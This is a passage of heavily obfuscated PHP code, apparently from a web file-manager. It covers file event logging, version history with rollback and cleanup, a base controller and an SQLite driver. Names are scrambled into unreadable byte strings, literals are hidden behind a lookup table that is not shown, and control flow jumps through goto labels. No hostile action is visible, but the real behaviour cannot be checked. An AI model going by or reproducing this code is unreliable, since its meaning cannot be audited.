$this->addEvent($BÊ©ÆÁèè, $FÍΩÍääöë[2259], $C∫â‘ùÆÇ»); goto c€π¥û›∞à; dÛ‡£à‘Æé: $this->addEvent($f©üÎﬁ·Ç≈, $FÍΩÍääöë[488], $C∫â‘ùÆÇ»); $Fÿ∫âﬂÕ´Â = $Aíÿ∏ü™“ﬁ->sourceInfo($f©üÎﬁ·Ç≈); $C∫â‘ùÆÇ» = array($FÍΩÍääöë[366] => $Fÿ∫âﬂÕ´Â[$FÍΩÍääöë[366]], $FÍΩÍääöë[28] => $Fÿ∫âﬂÕ´Â[$FÍΩÍääöë[28]]); goto D¿˜Áèﬁîê; dﬁã∞ÕóÛÊ: $F≤¯¨®Æ‘√ = $Aíÿ∏ü™“ﬁ->sourceInfo($BÊ©ÆÁèè); $C¬ÕÍâ˜–Ù = $Aíÿ∏ü™“ﬁ->sourceInfo($EÏÛä®åì ); $C∫â‘ùÆÇ» = array($FÍΩÍääöë[1010] => $BÊ©ÆÁèè, $FÍΩÍääöë[2255] => $F≤¯¨®Æ‘√[$FÍΩÍääöë[28]], $FÍΩÍääöë[2256] => $F≤¯¨®Æ‘√[$FÍΩÍääöë[462]], $FÍΩÍääöë[1011] => $EÏÛä®åì , $FÍΩÍääöë[2257] => $C¬ÕÍâ˜–Ù[$FÍΩÍääöë[28]], $FÍΩÍääöë[2258] => $C¬ÕÍâ˜–Ù[$FÍΩÍääöë[462]]); goto dÛ‡£à‘Æé; Dôûôöè‘Ü: $FÍΩÍääöë =& $_SERVER[—Ω]; $Aíÿ∏ü™“ﬁ = Model($FÍΩÍääöë[1114]); $Fÿ∫âﬂÕ´Â = $Aíÿ∏ü™“ﬁ->sourceInfo($f©üÎﬁ·Ç≈); goto dﬁã∞ÕóÛÊ; c€π¥û›∞à: } public function eventCopy($Cú¯£Õâó˘) { $this->eventCreate($Cú¯£Õâó˘, $_SERVER[—Ω][486]); } public function eventRename($d©¬¿Ë´Õü, $fÖ∏Í“†Á®, $C«»◊∞å‹ÿ) { $Bœ®≤ﬂªŸ– =& $_SERVER[—Ω]; $E¢çØ…⁄…≥ = array($Bœ®≤ﬂªŸ–[1010] => $fÖ∏Í“†Á®, $Bœ®≤ﬂªŸ–[1011] => $C«»◊∞å‹ÿ); return $this->addEvent($d©¬¿Ë´Õü, $Bœ®≤ﬂªŸ–[1126], $E¢çØ…⁄…≥); } public function eventAddComment($Eº•“èÍå™, $cÑﬂ“êﬁÁù) { return $this->addEvent($Eº•“èÍå™, $_SERVER[—Ω][2260], $cÑﬂ“êﬁÁù); } public function eventAddDesc($BÎüΩîƒ∆¨, $c≠öùœ‹≈ˆ) { return $this->addEvent($BÎüΩîƒ∆¨, $_SERVER[—Ω][2261], $c≠öùœ‹≈ˆ); } public function listBySource($bÛ Ç≥—) { goto aÔ±›ëäõÊ; a∂π≤¢à‹ò: if ($fì“ô—õ’û[$AñÇﬁπó±Ç[367]] == $AñÇﬁπó±Ç[83]) { $bÑ™ª∑äáí = Model($AñÇﬁπó±Ç[1114])->listSearchChildren($bÛ Ç≥—, 20000); $bÑ™ª∑äáí[] = $bÛ Ç≥— . $AñÇﬁπó±Ç[358]; $Eæ°≈âÏ˘ˆ = array($AñÇﬁπó±Ç[366] => array($AñÇﬁπó±Ç[7], $bÑ™ª∑äáí)); } $cÌÇ…–ÙÀÍ = $this->where($Eæ°≈âÏ˘ˆ)->order($AñÇﬁπó±Ç[2262])->selectPage(); if ($cÌÇ…–ÙÀÍ[$AñÇﬁπó±Ç[348]][$AñÇﬁπó±Ç[349]] == 0) { $cÌÇ…–ÙÀÍ[$AñÇﬁπó±Ç[348]][$AñÇﬁπó±Ç[349]] = 1; $cÌÇ…–ÙÀÍ[$AñÇﬁπó±Ç[351]] = array(array($AñÇﬁπó±Ç[380] => $bÛ Ç≥—, $AñÇﬁπó±Ç[2245] => $fì“ô—õ’û[$AñÇﬁπó±Ç[457]], $AñÇﬁπó±Ç[1408] => $fì“ô—õ’û[$AñÇﬁπó±Ç[375]], $AñÇﬁπó±Ç[385] => $AñÇﬁπó±Ç[2263], $AñÇﬁπó±Ç[386] => $fì“ô—õ’û[$AñÇﬁπó±Ç[184]], $AñÇﬁπó±Ç[1410] => $AñÇﬁπó±Ç[33])); } goto DåûÁöá¥ï; aÔ±›ëäõÊ: $AñÇﬁπó±Ç =& $_SERVER[—Ω]; $fì“ô—õ’û = Model($AñÇﬁπó±Ç[1114])->sourceInfo($bÛ Ç≥—); $Eæ°≈âÏ˘ˆ = array($AñÇﬁπó±Ç[380] => $bÛ Ç≥—); goto a∂π≤¢à‹ò; DåûÁöá¥ï: $cÌÇ…–ÙÀÍ = $this->eventListParse($cÌÇ…–ÙÀÍ, $bÛ Ç≥—); show_json($cÌÇ…–ÙÀÍ); goto AÁã≥ª¬é»; AÁã≥ª¬é»: } private function eventListParse($d®õ≈æ≥∂€, $báÓñ¬ÿÓÇ) { goto C¢æÎñÛ˘Á; D≤‡¬”§™ï: return $d®õ≈æ≥∂€; goto CÒüÉ¢«Ã–; C¢æÎñÛ˘Á: $f∂ìá¨©éñ =& $_SERVER[—Ω]; $D¯ƒ•Ñ§· = $d®õ≈æ≥∂€[$f∂ìá¨©éñ[351]]; $F‚πî£∏êÌ = array_to_keyvalue($D¯ƒ•Ñ§·, $f∂ìá¨©éñ[33], $f∂ìá¨©éñ[366]); goto AÇΩºÑäê≥; FÔéâÂ°æ’: $F‚πî£∏êÌ = array_unique($F‚πî£∏êÌ); $E”ï°·¨ÉÂ = array_unique(array_to_keyvalue($D¯ƒ•Ñ§·, $f∂ìá¨©éñ[33], $f∂ìá¨©éñ[1417])); $B∞∑Û«â—€ = Model($f∂ìá¨©éñ[473])->userListInfo($E”ï°·¨ÉÂ); goto cÆƒîﬂ™†; cÆƒîﬂ™†: $f¶Çî˜ù≠Ô = Model($f∂ìá¨©éñ[762])->sourceListInfo($F‚πî£∏êÌ, !0); foreach ($D¯ƒ•Ñ§· as &$aüÑàÉ≠Ê„) { if ($aüÑàÉ≠Ê„[$f∂ìá¨©éñ[29]] == $f∂ìá¨©éñ[488] && isset($aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[1010]])) { $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[1010]] = $f¶Çî˜ù≠Ô[$aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[1010]]]; $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[1011]] = $f¶Çî˜ù≠Ô[$aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[1011]]]; } if ($aüÑàÉ≠Ê„[$f∂ìá¨©éñ[29]] == $f∂ìá¨©éñ[2259] && isset($aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[366]])) { $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[366]] = $f¶Çî˜ù≠Ô[$aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]][$f∂ìá¨©éñ[366]]]; } $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[388]] = $f¶Çî˜ù≠Ô[$aüÑàÉ≠Ê„[$f∂ìá¨©éñ[366]]]; $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[2264]] = $f¶Çî˜ù≠Ô[$aüÑàÉ≠Ê„[$f∂ìá¨©éñ[2251]]]; if ($aüÑàÉ≠Ê„[$f∂ìá¨©éñ[29]] == $f∂ìá¨©éñ[2047]) { $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[2264]] = $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[388]]; $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[2251]] = $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[2264]][$f∂ìá¨©éñ[366]]; $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[388]] = !1; $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[366]] = $f∂ìá¨©éñ[33]; } $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[2217]] = $B∞∑Û«â—€[$aüÑàÉ≠Ê„[$f∂ìá¨©éñ[1417]]]; } $d®õ≈æ≥∂€[$f∂ìá¨©éñ[351]] = $D¯ƒ•Ñ§·; goto D≤‡¬”§™ï; AÇΩºÑäê≥: $c∞√Ñ––åπ = array_to_keyvalue($D¯ƒ•Ñ§·, $f∂ìá¨©éñ[33], $f∂ìá¨©éñ[2251]); foreach ($D¯ƒ•Ñ§· as $aüÑàÉ≠Ê„) { $Bç–‡±é—≈ = $aüÑàÉ≠Ê„[$f∂ìá¨©éñ[401]]; if ($aüÑàÉ≠Ê„[$f∂ìá¨©éñ[29]] == $f∂ìá¨©éñ[488] && isset($Bç–‡±é—≈[$f∂ìá¨©éñ[1010]])) { $F‚πî£∏êÌ[] = $Bç–‡±é—≈[$f∂ìá¨©éñ[1010]] . $f∂ìá¨©éñ[33]; $F‚πî£∏êÌ[] = $Bç–‡±é—≈[$f∂ìá¨©éñ[1011]] . $f∂ìá¨©éñ[33]; } if ($aüÑàÉ≠Ê„[$f∂ìá¨©éñ[29]] == $f∂ìá¨©éñ[2259] && isset($Bç–‡±é—≈[$f∂ìá¨©éñ[366]])) { $F‚πî£∏êÌ[] = $Bç–‡±é—≈[$f∂ìá¨©éñ[366]] . $f∂ìá¨©éñ[33]; } } $F‚πî£∏êÌ = array_merge($F‚πî£∏êÌ, $c∞√Ñ––åπ, array($báÓñ¬ÿÓÇ . $f∂ìá¨©éñ[33])); goto FÔéâÂ°æ’; CÒüÉ¢«Ã–: } public function removeBySource($Bó≠‹¯Æ≤é) { $d¯‡…Øù„ˆ = array($_SERVER[—Ω][380] => $Bó≠‹¯Æ≤é); $this->where($d¯‡…Øù„ˆ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\x75\x72\143\145\137\x68\x69\163\x74\x6f\162\x79"; public function addHistory($Dèı”Ëπ , $A⁄éª ä€Á = '') { $fÚ‹ë‘ıâï =& $_SERVER[—Ω]; $b∂òéëãû∞ = array($fÚ‹ë‘ıâï[380] => $Dèı”Ëπ [$fÚ‹ë‘ıâï[366]], $fÚ‹ë‘ıâï[1408] => isset($Dèı”Ëπ [$fÚ‹ë‘ıâï[376]]) ? $Dèı”Ëπ [$fÚ‹ë‘ıâï[376]] : $Dèı”Ëπ [$fÚ‹ë‘ıâï[375]], $fÚ‹ë‘ıâï[416] => $Dèı”Ëπ [$fÚ‹ë‘ıâï[415]], $fÚ‹ë‘ıâï[516] => $Dèı”Ëπ [$fÚ‹ë‘ıâï[77]], $fÚ‹ë‘ıâï[2265] => $A⁄éª ä€Á); $e≤Ï„ë¡ËÓ = $GLOBALS[$fÚ‹ë‘ıâï[6]][$fÚ‹ë‘ıâï[84]][$fÚ‹ë‘ıâï[2266]]; if ($e≤Ï„ë¡ËÓ > 1) { $this->historyAutoClear($b∂òéëãû∞[$fÚ‹ë‘ıâï[366]]); $this->add($b∂òéëãû∞); } Model($fÚ‹ë‘ıâï[2267])->eventFileEdit($Dèı”Ëπ [$fÚ‹ë‘ıâï[366]]); } private function historyAutoClear($Bø¶¢ÖÀ“Ñ) { goto dÓµñ¿µø©; dÓµñ¿µø©: $Bë‘Òè”¿ƒ =& $_SERVER[—Ω]; $c≈ãê≈—ﬁ– = Model($Bë‘Òè”¿ƒ[1092])->get($Bë‘Òè”¿ƒ[2268]); $E‚…ÕëîâŒ = $GLOBALS[$Bë‘Òè”¿ƒ[6]][$Bë‘Òè”¿ƒ[84]][$Bë‘Òè”¿ƒ[2266]]; goto Cëë¶ ∆¬§; D¶ë˜é«Õó: $e∞ê€òùˆ÷ = array_to_keyvalue($AèßàºÙä±, $Bë‘Òè”¿ƒ[33], $Bë‘Òè”¿ƒ[415]); $e∞ê€òùˆ÷ = array_slice($e∞ê€òùˆ÷, $Fè±œ¶Ó£ˆ); if (!$C´Û›à∂÷˘ || !$e∞ê€òùˆ÷) { return; } goto AÌÚÁ∏Œ›Û; Aß≠Ôí∑¯¶: if ($Fè±œ¶Ó£ˆ >= 500) { return; } $d°ØΩûºãå = array($Bë‘Òè”¿ƒ[380] => $Bø¶¢ÖÀ“Ñ); $AèßàºÙä± = $this->field($Bë‘Òè”¿ƒ[2270])->where($d°ØΩûºãå)->order($Bë‘Òè”¿ƒ[2262])->select(); goto a°ÜìêÑ¬ﬂ; a°ÜìêÑ¬ﬂ: if (!$AèßàºÙä± || $Fè±œ¶Ó£ˆ >= count($AèßàºÙä±)) { return; } $C´Û›à∂÷˘ = array_to_keyvalue($AèßàºÙä±, $Bë‘Òè”¿ƒ[33], $Bë‘Òè”¿ƒ[364]); $C´Û›à∂÷˘ = array_slice($C´Û›à∂÷˘, $Fè±œ¶Ó£ˆ); goto D¶ë˜é«Õó; AÌÚÁ∏Œ›Û: $d°ØΩûºãå = array($Bë‘Òè”¿ƒ[382] => array($Bë‘Òè”¿ƒ[7], $C´Û›à∂÷˘)); $this->where($d°ØΩûºãå)->delete(); Model($Bë‘Òè”¿ƒ[418])->remove($e∞ê€òùˆ÷); goto d•™êëäÂÎ; Cëë¶ ∆¬§: $eíÂÑ§⁄≥· = $c≈ãê≈—ﬁ– == $Bë‘Òè”¿ƒ[2269] ? 3 : $E‚…ÕëîâŒ; if ($E‚…ÕëîâŒ <= 1) { $eíÂÑ§⁄≥· = 1; } $Fè±œ¶Ó£ˆ = $eíÂÑ§⁄≥· - 1; goto Aß≠Ôí∑¯¶; d•™êëäÂÎ: } public function listData($c≈ˆ∏ö»É÷) { goto FÇ∞ÁÿÌΩµ; fÎäßœ”÷ñ: $a˘ÌëÎÎÇÛ = 3; if ($dÔ≈’Ñ≥®¥ == $aáîªÇøÓÏ[2269]) { $FÖ‹ªΩ∞ì˜[$aáîªÇøÓÏ[351]] = array_slice($FÖ‹ªΩ∞ì˜[$aáîªÇøÓÏ[351]], 0, $a˘ÌëÎÎÇÛ); $FÖ‹ªΩ∞ì˜[$aáîªÇøÓÏ[348]] = array($aáîªÇøÓÏ[2272] => 1, $aáîªÇøÓÏ[2273] => 20, $aáîªÇøÓÏ[2274] => 1, $aáîªÇøÓÏ[2275] => count($FÖ‹ªΩ∞ì˜[$aáîªÇøÓÏ[351]])); } return $FÖ‹ªΩ∞ì˜; goto B‰û’É¯≈‰; FÇ∞ÁÿÌΩµ: $aáîªÇøÓÏ =& $_SERVER[—Ω]; $A§ÜÒóüëË = array($aáîªÇøÓÏ[380] => $c≈ˆ∏ö»É÷); $eàπ„¢Á·ä = $aáîªÇøÓÏ[2271]; goto eˆóÚ›ﬁ€É; eˆóÚ›ﬁ€É: $FÖ‹ªΩ∞ì˜ = $this->field($eàπ„¢Á·ä)->where($A§ÜÒóüëË)->order($aáîªÇøÓÏ[2262])->selectPage(); $this->_listAppendUser($FÖ‹ªΩ∞ì˜[$aáîªÇøÓÏ[351]]); $dÔ≈’Ñ≥®¥ = Model($aáîªÇøÓÏ[1092])->get($aáîªÇøÓÏ[2268]); goto fÎäßœ”÷ñ; B‰û’É¯≈‰: } protected function _listAppendUser(&$cÿ¥ºÁí¯œ) { $B±“ÃÉéµ¢ =& $_SERVER[—Ω]; $aßÆµ≤”Çè = array_to_keyvalue($cÿ¥ºÁí¯œ, $B±“ÃÉéµ¢[33], $B±“ÃÉéµ¢[1417]); $A™Æ¥•–√™ = Model($B±“ÃÉéµ¢[473])->userListInfo($aßÆµ≤”Çè); foreach ($cÿ¥ºÁí¯œ as &$a¬î •Ìœ÷) { $BÊ¥ÉÕ§Ú¶ = $a¬î •Ìœ÷[$B±“ÃÉéµ¢[1417]]; $a¬î •Ìœ÷[$B±“ÃÉéµ¢[375]] = $A™Æ¥•–√™[$BÊ¥ÉÕ§Ú¶] ? $A™Æ¥•–√™[$BÊ¥ÉÕ§Ú¶] : !1; } } public function fileInfo($aÓéΩ—©≤ã) { $aàÑﬂ·Ñ’Ô =& $_SERVER[—Ω]; $aÕ˜¡æ∫É∏ = $this->tablePrefix; $E®à∏◊ÃÖï = "{$aÕ˜¡æ∫É∏}\151\x6f\x5f\146\151\x6c\145\x20\x66\x69\154\x65\163\x20\x6f\x6e\40\x66\x69\154\x65\163\x2e\146\151\154\x65\111\x44\40\x3d\40\150\151\163\x74\157\162\171\56\146\151\154\145\111\104"; return $this->alias($aàÑﬂ·Ñ’Ô[2276])->where(array($aàÑﬂ·Ñ’Ô[382] => $aÓéΩ—©≤ã))->join($E®à∏◊ÃÖï, $aàÑﬂ·Ñ’Ô[2277])->find(); } public function removeItem($cÃÇ¢ïÔÜ‰) { $A∞—òØ∞Ö¯ =& $_SERVER[—Ω]; $e◊ ﬁÎ∫ÜÚ = array($A∞—òØ∞Ö¯[382] => $cÃÇ¢ïÔÜ‰); $CÒ¶ÙŸ∏ä™ = $this->where($e◊ ﬁÎ∫ÜÚ)->find(); if ($CÒ¶ÙŸ∏ä™) { $BÜ™‡êâ¶É = $this->where($e◊ ﬁÎ∫ÜÚ)->delete(); Model($A∞—òØ∞Ö¯[418])->remove($CÒ¶ÙŸ∏ä™[$A∞—òØ∞Ö¯[415]]); return $BÜ™‡êâ¶É; } return !1; } public function removeBySource($cÔä∞â•æœ) { goto d¢Âêµç≥å; Aå«ﬁ‰ﬁÀ“: $E≤ﬂòµ£ê€ = array($b‡ü¨áÑè[380] => array($b‡ü¨áÑè[7], $cÔä∞â•æœ)); $DÁÉ–ú≥«â = $this->field($b‡ü¨áÑè[416])->where($E≤ﬂòµ£ê€)->select(); if ($DÁÉ–ú≥«â) { $this->where($E≤ﬂòµ£ê€)->delete(); $bÒÍêèÏ€⁄ = array_to_keyvalue($DÁÉ–ú≥«â, $b‡ü¨áÑè[33], $b‡ü¨áÑè[415]); Model($b‡ü¨áÑè[418])->remove($bÒÍêèÏ€⁄); } goto e∫◊µ‘∞Ó∑; d¢Âêµç≥å: $b‡ü¨áÑè =& $_SERVER[—Ω]; if (!$cÔä∞â•æœ) { return !1; } if (!is_array($cÔä∞â•æœ)) { $cÔä∞â•æœ = array($cÔä∞â•æœ); } goto Aå«ﬁ‰ﬁÀ“; e∫◊µ‘∞Ó∑: return !0; goto aæë§î’·é; aæë§î’·é: } public function setDetail($AÜ§Ï≠íâÿ, $bñ–Œò„ø) { $E›Ω¨£ì°£ =& $_SERVER[—Ω]; return $this->where(array($E›Ω¨£ì°£[382] => $AÜ§Ï≠íâÿ))->save(array($E›Ω¨£ì°£[2265] => $bñ–Œò„ø)); } public function rollbackToItem($A∆ÜπøñÌ™, $A≠ÚÖ±∏ﬁ≤) { goto d‚Ë∏è¿†ª; c¨Æ⁄ëÍî¡: $EëÆÂÕì¡ı = $this->find($A≠ÚÖ±∏ﬁ≤); $CÜµÑ‡–ë• = array($cû±∑†∂µÕ[415] => $EëÆÂÕì¡ı[$cû±∑†∂µÕ[415]], $cû±∑†∂µÕ[77] => $EëÆÂÕì¡ı[$cû±∑†∂µÕ[77]], $cû±∑†∂µÕ[107] => time(), $cû±∑†∂µÕ[376] => USER_ID); Model($cû±∑†∂µÕ[762])->where(array($cû±∑†∂µÕ[366] => $A∆ÜπøñÌ™))->save($CÜµÑ‡–ë•); goto aø‰ê“òÿï; aø‰ê“òÿï: return $this->where(array($cû±∑†∂µÕ[382] => $A≠ÚÖ±∏ﬁ≤))->delete(); goto f·∑∫ƒÒé∏; d‚Ë∏è¿†ª: $cû±∑†∂µÕ =& $_SERVER[—Ω]; $B≤Ô‚êŒπ£ = Model($cû±∑†∂µÕ[762])->sourceInfo($A∆ÜπøñÌ™); $this->addHistory($B≤Ô‚êŒπ£); goto c¨Æ⁄ëÍî¡; f·∑∫ƒÒé∏: } public function clearSame($døˆ˘‰˜‘Ù) { goto EÎ∏»§¬Á≠; EÎ∏»§¬Á≠: $càô•ÎüÍ∑ =& $_SERVER[—Ω]; $b—ŒÊö∫ÉÌ = $this->listData($døˆ˘‰˜‘Ù); $Dﬁè¨ª‘•ç = array_to_keyvalue_group($b—ŒÊö∫ÉÌ, $càô•ÎüÍ∑[415]); goto Bêó»ç≈¢π; Bêó»ç≈¢π: $DÇè©Ê√ë¥ = array(); $dÑ¢Á≈©¢› = array(); foreach ($Dﬁè¨ª‘•ç as $f‹áÏ¡»∫ ) { if (!$f‹áÏ¡»∫  || count($f‹áÏ¡»∫ ) <= 1) { continue; } foreach ($f‹áÏ¡»∫  as $föñîÀéﬁŒ) { $DÇè©Ê√ë¥[] = $föñîÀéﬁŒ[$càô•ÎüÍ∑[415]]; $dÑ¢Á≈©¢›[] = $föñîÀéﬁŒ[$càô•ÎüÍ∑[364]]; } } goto b∏øÖµÜ∆ü; b∏øÖµÜ∆ü: if (!$dÑ¢Á≈©¢›) { return; } $this->where(array($càô•ÎüÍ∑[364] => array($càô•ÎüÍ∑[7], $dÑ¢Á≈©¢›)))->delete(); Model($càô•ÎüÍ∑[418])->remove($DÇè©Ê√ë¥); goto B√Ëü´úÿÌ; B√Ëü´úÿÌ: } public function userSpace() { $fóëà´⁄Æë =& $_SERVER[—Ω]; $EÑ¿Æ´´¥ô = $this->tablePrefix; $c≠éË‰„Á‡ = array($fóëà´⁄Æë[1408] => USER_ID); $EèˆË∫òäâ = "{$EÑ¿Æ´´¥ô}\151\157\x5f\x66\x69\x6c\x65\x20\x66\x69\154\x65\163\40\157\156\x20\x66\x69\x6c\145\x73\x2e\x66\x69\x6c\145\x49\x44\40\75\40\150\151\163\x74\157\162\x79\x2e\x66\x69\x6c\x65\x49\x44"; return $this->alias($fóëà´⁄Æë[2276])->where($c≠éË‰„Á‡)->join($EèˆË∫òäâ, $fóëà´⁄Æë[2277])->sum($fóëà´⁄Æë[77]); } } goto fƒ∂¶ç®”Ï; A™≥é¶º›ä: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto AÜñÇ·¬Ìﬁ; AÜñÇ·¬Ìﬁ: $d¿çû∏Ì›Ñ =& $_SERVER[—Ω]; global $in, $config; $this->config =& $config; goto Dï£úé¯àÖ; Dï£úé¯àÖ: $this->in =& $in; $this->values[$d¿çû∏Ì›Ñ[6]] =& $config; $this->values[$d¿çû∏Ì›Ñ[7]] =& $in; goto B•ñìÀÜ¢«; B•ñìÀÜ¢«: $this->tpl = TEMPLATE . MOD . $d¿çû∏Ì›Ñ[8]; $this->_classObjectID = mt_rand(0, 10000); goto cÎãÂàæª√; cÎãÂàæª√: } public function loadClass($b˜Éùöü±Ò) { if (1 === func_num_args()) { $this->{$b˜Éùöü±Ò} = new $b˜Éùöü±Ò(); } else { $f…¨Êˆâ£î = new ReflectionClass($b˜Éùöü±Ò); $C„©ÜÀ¢ßô = func_get_args(); array_shift($C„©ÜÀ¢ßô); $this->{$b˜Éùöü±Ò} = $f…¨Êˆâ£î->newInstanceArgs($C„©ÜÀ¢ßô); } return $this->{$b˜Éùöü±Ò}; } protected function assign($f≠™Ê¶ÙÉã, $bé’ﬂöêç˘) { $this->values[$f≠™Ê¶ÙÉã] = $bé’ﬂöêç˘; } protected function display($eƒáß‚âàæ) { ob_end_clean(); extract($this->values); require $this->tpl . $eƒáß‚âàæ; } } class DbSqliteBase extends Db { public function __construct($C√∞‹Ÿúèò = '') { $A§€÷≥â¨É =& $_SERVER[—Ω]; if (!extension_loaded($A§€÷≥â¨É[9])) { think_exception(think_lang($A§€÷≥â¨É[10]) . $A§€÷≥â¨É[11]); } if (!empty($C√∞‹Ÿúèò)) { if (!isset($C√∞‹Ÿúèò[$A§€÷≥â¨É[12]])) { $C√∞‹Ÿúèò[$A§€÷≥â¨É[12]] = 438; } $this->config = $C√∞‹Ÿúèò; if (empty($this->config[$A§€÷≥â¨É[13]])) { $this->config[$A§€÷≥â¨É[13]] = array(); } } } public function connect($d◊åÇÑÇŒ– = '', $EÑ»∏î’Â¥ = 0) { $e√¨ú¡â≤› =& $_SERVER[—Ω]; if (!isset($this->linkID[$EÑ»∏î’Â¥])) { goto bª≈Æ∞Æ£ñ; eı–≥ï¿ËÑ: @sqlite_busy_timeout($this->linkID[$EÑ»∏î’Â¥], 30000); if (1 != think_config($e√¨ú¡â≤›[18])) { unset($this->config); } goto B®Ú„úÂÂ≤; bª≈Æ∞Æ£ñ: if (empty($d◊åÇÑÇŒ–)) { $d◊åÇÑÇŒ– = $this->config; } $c·ßÔò£≠Ô = !empty($d◊åÇÑÇŒ–[$e√¨ú¡â≤›[13]][$e√¨ú¡â≤›[14]]) ? $d◊åÇÑÇŒ–[$e√¨ú¡â≤›[13]][$e√¨ú¡â≤›[14]] : $this->pconnect; $fÑ‰ÖíÜÍ√ = $c·ßÔò£≠Ô ? $e√¨ú¡â≤›[15] : $e√¨ú¡â≤›[16]; goto DÎ‰ÁÊ¯é◊; DÎ‰ÁÊ¯é◊: $this->linkID[$EÑ»∏î’Â¥] = $fÑ‰ÖíÜÍ√($d◊åÇÑÇŒ–[$e√¨ú¡â≤›[17]], $d◊åÇÑÇŒ–[$e√¨ú¡â≤›[12]]); if (!$this->linkID[$EÑ»∏î’Â¥]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto eı–≥ï¿ËÑ; B®Ú„úÂÂ≤: } return $this->linkID[$EÑ»∏î’Â¥]; } public function free() { $this->queryID = null; } public function query($E«∫Õò ≤ï) { goto F®î≤ß®ﬁ∆; F®î≤ß®ﬁ∆: $eçà˘ﬁû“Ò =& $_SERVER[—Ω]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto c™ﬂ˜ƒ‚≈ù; B∫í◊ﬁêªå: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $b„¥¨ØÒ∫Ÿ = $this->getAll(); return $b„¥¨ØÒ∫Ÿ; } goto EΩ≤ªõàˆÜ; c™ﬂ˜ƒ‚≈ù: $this->queryStr = $E«∫Õò ≤ï; if ($this->queryID) { $this->free(); } think_action_status($eçà˘ﬁû“Ò[19], 1); goto CªÂ»ì∫≤Ì; CªÂ»ì∫≤Ì: think_status($eçà˘ﬁû“Ò[20]); $this->queryID = sqlite_query($this->_linkID, $E«∫Õò ≤ï); $this->debug(); goto B∫í◊ﬁêªå; EΩ≤ªõàˆÜ: } public function execute($e®åˆÍ∫“ﬁ) { goto D˜€”ÚÛÉﬂ; Fòë∞òßÇË: $this->queryStr = $e®åˆÍ∫“ﬁ; if ($this->queryID) { $this->free(); } think_action_status($AÕä∞◊‚ã⁄[21], 1); goto d…≈ø¶öëÿ; fÇ´◊Ω–Õ¥: if (!1 === $bÌ‹Âó∑®í) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto aŒ°ﬁùú«—; d…≈ø¶öëÿ: think_status($AÕä∞◊‚ã⁄[20]); $bÌ‹Âó∑®í = sqlite_exec($this->_linkID, $e®åˆÍ∫“ﬁ); $this->debug(); goto fÇ´◊Ω–Õ¥; D˜€”ÚÛÉﬂ: $AÕä∞◊‚ã⁄ =& $_SERVER[—Ω]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fòë∞òßÇË; aŒ°ﬁùú«—: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[—Ω][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F∑É√ùÂœÂ = sqlite_query($this->_linkID, $_SERVER[—Ω][23]); if (!$F∑É√ùÂœÂ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $c–“Ã…©¢˘ = sqlite_query($this->_linkID, $_SERVER[—Ω][24]); if (!$c–“Ã…©¢˘) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $EÍÂô≤÷ñë = array(); if ($this->numRows > 0) { for ($cÉÎ∆‚¬≤ = 0; $cÉÎ∆‚¬≤ < $this->numRows; $cÉÎ∆‚¬≤++) { $EÍÂô≤÷ñë[$cÉÎ∆‚¬≤] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $EÍÂô≤÷ñë; } public function getFields($fÓñ´ºŸﬂ) { $Eà·∑∞Õó =& $_SERVER[—Ω]; $Dó‰∏ºç¯á = $this->query($Eà·∑∞Õó[25] . $fÓñ´ºŸﬂ . $Eà·∑∞Õó[26]); $a¥„È”ÿ≈¯ = array(); if ($Dó‰∏ºç¯á) { foreach ($Dó‰∏ºç¯á as $c© …Èì®Ü => $d‚–Ùóßò®) { $a¥„È”ÿ≈¯[$d‚–Ùóßò®[$Eà·∑∞Õó[27]]] = array($Eà·∑∞Õó[28] => $d‚–Ùóßò®[$Eà·∑∞Õó[27]], $Eà·∑∞Õó[29] => $d‚–Ùóßò®[$Eà·∑∞Õó[30]], $Eà·∑∞Õó[31] => (bool) ($d‚–Ùóßò®[$Eà·∑∞Õó[32]] === $Eà·∑∞Õó[33]), $Eà·∑∞Õó[34] => $d‚–Ùóßò®[$Eà·∑∞Õó[35]], $Eà·∑∞Õó[36] => strtolower($d‚–Ùóßò®[$Eà·∑∞Õó[37]]) == $Eà·∑∞Õó[38], $Eà·∑∞Õó[39] => strtolower($d‚–Ùóßò®[$Eà·∑∞Õó[40]]) == $Eà·∑∞Õó[41]); } } return $a¥„È”ÿ≈¯; } public function getTables($DëÃÈèœÔÑ = '') { $c˜ëË‰ÉÓ√ =& $_SERVER[—Ω]; $fÿÇê¥Èë± = $this->query($c˜ëË‰ÉÓ√[42] . $c˜ëË‰ÉÓ√[43] . $c˜ëË‰ÉÓ√[44]); $a˜à´ôøﬂÿ = 